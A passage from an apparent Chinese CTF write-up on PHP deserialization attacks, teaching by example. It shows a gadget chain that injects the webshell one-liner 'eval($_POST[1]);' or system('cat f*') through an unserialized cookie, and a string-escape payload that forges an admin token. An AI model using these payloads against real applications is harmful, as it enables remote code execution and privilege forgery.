single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'info'</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">-></span><span class=\"token function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">info</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$user</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">user</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">backDoor</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>类\n    <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话用到了魔术方法，对魔术方法进行一个简单的介绍</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>：当对象被创建的时候自动调用，对对象进行初始化。\n<span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>：和构造函数相反，当对象所在函数调用完毕后执行<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>然后此时我们看它整个流程的话，就是创建对象时初始化这个info类，然后对username和password进行了一个检测，然后此时执行完了，就需要释放序列化的对象，此时就用到了这个<code>_destruct</code>类，这个类是调用了getinfo方法，然后它是输出了username，这里的话就是输出了<code>xxxxxx</code><br>然后你看这时候有个<code>backdoor</code>类没有使用，反序列化的宗旨就是不改代码，但可以更改它的属性，我们这里如果想利用这个backdoor类，那我们将它的class属性更改为backdoor，此时就执行了backdoor里的，然后它里面的方法是eval了$code，那我们就可以定义这个$code为一句话木马或者其它，此时就可以进行rce<br>代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'backDoor'</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">backDoor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">backDoor</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'eval($_POST[1]);'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfShowUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时get传username和password随便传个参数，然后post上传1即可进行<br>或者直接构造语句<br>代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$class</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">backDoor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">backDoor</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'system(\"cat f*\");'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfShowUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>而后抓包修改cookie并随意设置用户名和密码即可<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545171.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"字符串逃逸\"><a href=\"#字符串逃逸\" class=\"headerlink\" title=\"字符串逃逸\"></a>字符串逃逸</h2><h3 id=\"0X01（字符串增多）\"><a href=\"#0X01（字符串增多）\" class=\"headerlink\" title=\"0X01（字符串增多）\"></a>0X01（字符串增多）</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以看出这里是检测cookie的msg变量，那么一会构造完放cookie里即可，然后要求是token等于admin，此时我们就可以开始构造</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuck'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"message\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"from\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"fuck\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"msg\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"b\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"to\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"c\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"token\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"user\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时我们修改后面的token为<code>s:5:&quot;admin&quot;</code>，然后添加到<code>fuck</code>的后面</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$a</span><span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuck\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:4:\"user\";&#125;'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>由于<code>&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code>共61个字符，所以我们构造出61个user，如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$a</span><span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:5:\"admin\";&#125;'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时加上过滤条件，同时看是否一致</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$a</span><span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:5:\"admin\";&#125;'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuck'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'loveU'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"message\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"from\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">310</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"msg\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"b\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"to\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"c\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"token\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token string double-quoted-string\">\";s:3:\"</span>msg<span class=\"token string double-quoted-string\">\";s:1:\"</span>b<span class=\"token string double-quoted-string\">\";s:2:\"</span>to<span class=\"token string double-quoted-string\">\";s:1:\"</span>c<span class=\"token string double-quoted-string\">\";s:5:\"</span>token<span class=\"token string double-quoted-string\">\";s:4:\"</span>user\"<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>310个，后面的loveU的总数也正好是310个，此时就构造好了，然后看题目里有个base64解码，所以我们加上base64加密即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$a</span><span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:5:\"admin\";&#125;'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuck'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'loveU'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code 